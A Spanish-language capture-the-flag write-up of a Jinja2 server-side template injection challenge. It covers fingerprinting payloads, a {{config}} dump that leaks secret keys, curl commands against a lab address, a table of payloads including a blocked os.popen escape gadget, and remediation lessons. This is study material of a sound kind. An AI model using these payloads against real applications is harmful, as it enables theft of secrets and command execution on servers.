# Desafío 45 — Sistema de avisos internos (SSTI Jinja2)

| Campo | Valor |
|---|---|
| Evento | Código de Marte 2026-11-13 (`codigodemarte20261113`) |
| Categoría | Web / Server-Side Template Injection (SSTI) |
| Dificultad | fácil-media |
| Objetivo | `http://203.0.113.10:8008` |
| Estado | ✅ resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado

> El sistema de avisos "formatea" el mensaje antes de publicarlo. En 2015 se demostró que motores pensados para mostrar texto podían terminar evaluando lo que escribía el usuario.

La referencia a 2015 es el trabajo de James Kettle sobre **server-side template injection**
(presentado en Black Hat 2015): motores como Jinja2/Twig evalúan las expresiones `{{ ... }}` que
llegan desde la entrada del usuario.

## Reconocimiento

- `GET /` muestra un formulario con un único campo `mensaje` (máx. 200 caracteres) y publica
  `[AVISO SICH] <mensaje>` dentro de un `<pre>`.
- `Server: gunicorn` → stack Python/Flask.
- Prueba inicial: `mensaje={{7*7}}` se publica como `49` (no como texto literal).
- `{{7*'7'}}` → `7777777` confirma **Jinja2** (en Twig daría `49`).
- `{{self}}` → `<TemplateReference None>`; el contexto es una plantilla renderizada en el servidor.

## Análisis

El mensaje se pasa a `render_template_string`, así que cualquier expresión Jinja se evalúa. El
siguiente paso lógico es leer los objetos globales de la plantilla. `{{config}}` es un global de
Flask y no está restringido:

```jinja
{{config}}
```

Respuesta:

```text
{'NOMBRE_MODULO': 'avisos-internos', 'VERSION': '3.2',
 'TOKEN_DEMO': 'flag{ejemplo}',
 'CLAVE_SICH': 'flag{ejemplo}'}
```

**Señuelo:** `TOKEN_DEMO` es una flag de demostración que el propio nombre descalifica. La clave
real es `CLAVE_SICH`.

El entorno es un **SandboxedEnvironment**: los escapes clásicos hacia ejecución de comandos se
bloquean.

| Payload | Resultado |
|---|---|
| `{{7*7}}` | `49` |
| `{{config}}` | fuga de configuración |
| `{{config['CLAVE_SICH']}}` | `flag{ejemplo}` |
| `{{config.TOKEN_DEMO}}` | `flag{ejemplo}` (señuelo) |
| `{{cycler.__init__.__globals__.os.popen('id').read()}}` | `Bloqueado :: el sandbox del SICH rechazo la operacion.` |

No hizo falta escapar del sandbox: la flag vive en la configuración que el propio motor expone.

## Solución (pasos reproducibles)

```bash
# 1) Confirmar la evaluacion (49)
curl -s -d "mensaje={{7*7}}" http://203.0.113.10:8008/ | grep -o '\[AVISO SICH\].*'

# 2) Volcar la configuracion de Flask y extraer la clave
curl -s --data-urlencode "mensaje={{config}}" http://203.0.113.10:8008/ \
  | grep -o 'CLAVE_SICH[^}]*}'
```

Automatizado: `python scripts/solve.py` (prueba `{{7*7}}`, vuelca `{{config}}`, descarta el
`TOKEN_DEMO` y guarda la flag en `flag.txt`).

```text
[*] {{7*7}} -> 49
[*] config -> {'NOMBRE_MODULO': 'avisos-internos', ..., 'CLAVE_SICH': 'flag{ejemplo}'}
[+] FLAG: flag{ejemplo}
```

## Flag

```
flag{ejemplo}
```

## Lecciones / notas

- **No renderizar entrada de usuario como plantilla.** Para texto plano se usa `{{ mensaje }}` con
  autoescape, nunca `render_template_string(mensaje)`.
- `{{7*7}}` → `49` y `{{7*'7'}}` → `7777777` identifican Jinja2; sirven de prueba mínima antes de
  cualquier payload más largo.
- **`{{config}}` es el primer volcado a probar** en Flask: expone claves, rutas y secretos sin
  necesidad de RCE. Un sandbox que bloquea `__globals__` no protege la configuración.
- Los señuelos con forma de flag (`TOKEN_DEMO`) se descartan por su propio nombre/semántica.
- Evidencia del intercambio HTTP en `evidence/` (inicio, aviso normal, prueba `{{7*7}}`, fuga de
  `{{config}}` y bloqueo del sandbox).
